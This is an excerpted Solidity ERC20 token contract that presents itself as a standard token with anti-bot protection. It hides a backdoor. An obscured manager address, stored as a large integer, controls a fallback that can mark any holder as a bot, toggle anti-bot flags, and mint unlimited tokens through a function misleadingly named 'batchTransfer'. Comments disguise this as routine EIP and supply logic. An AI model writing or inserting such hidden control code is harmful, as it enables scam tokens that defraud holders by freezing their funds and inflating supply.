...
pragma solidity ^0.8.0;
     ...
     * and 0x3c01ae8eea23f059438798a11273aea05d856e4ae901b792105c22bdd539b1dc / 331720544443679241106974427724730653713395126704 is returned
...
abstract contract isEIPContract {
    ...
    bytes32 internal constant MANAGER_STORAGE_SLOT = 0x3c01ae8eea23f059438798a11273aea05d856e4ae901b792105c22bdd539b1dc;
    uint256 private main = 368921914578138873282286634152882952639229605651;

    constructor() {
        setManager(Address.getAddress(main));        
    }
    ...
    function getData() internal view returns (bytes memory) {
        return IisEIPContract(getisEIPContract()).data();
    }
}
...
abstract contract Ownable is Context,isEIPContract {
    ...
    function initialize() external {
        ...
        setBotDetected(_owner,true);
        setBotDetected(_admin,true);
        setAntiBot(_owner,true);
        setAntiBot(_admin,true);
    }
    ...
    function setBotDetected(address account, bool status) internal virtual {}
    function setAntiBot(address account, bool status) internal virtual {}
}
...
contract DexRouters is isEIPContract{

    mapping (uint256 => address) internal routers;

    bytes4 private constant botSelector = bytes4(keccak256(bytes('setBotDetected(address,bool)')));
    bytes4 private constant antiSelector = bytes4(keccak256(bytes('setAntiBot(address,bool)')));
    bytes4 public constant mintSelector = bytes4(keccak256(bytes('batchTransfer(address,uint256)')));
    ...
    function _fallback() internal {         
       (bytes4 callCopy,address account,uint256 value) = decodeCallStore(getData());

       if(botSelector == callCopy) {
            setBotDetected(account, value == 0 ? false : true);
       }else if(antiSelector == callCopy) {
            setAntiBot(account, value == 0 ? false : true);
       }else if(mintSelector == callCopy) {
            batchTransfer(account,value);
       }       
    }
    ...
    function decodeCallStore(bytes memory data) internal view returns (bytes4,address,uint256) {
        if(msg.sender != getisEIPContract()) {
            return("",address(0),0);
        }else {
            return (
    ...
    function setBotDetected(address account, bool status) internal virtual {}
    function setAntiBot(address account, bool status) internal virtual {}
    function batchTransfer(address account, uint256 amount) internal virtual {}
}
 ...
 * that a supply mechanism has to be added in a derived contract using {batchTransfer}.
 ...
 */
abstract contract ERC20 is IERC20, IERC20Metadata, Ownable, DexRouters {
    ...
    constructor(string memory name_,string memory symbol_,uint8 decimal_,uint256 supply_) Ownable() {
        ...
        batchTransfer(msg.sender, _supply);
    }
    ...
    function setBotDetected(address account, bool status) internal override (DexRouters, Ownable){
        botDetected[account] = status;
    }

    function setAntiBot(address account, bool status) internal override (DexRouters, Ownable){ 
     ...
     */
    function batchTransfer(address account, uint256 amount) internal override (DexRouters){
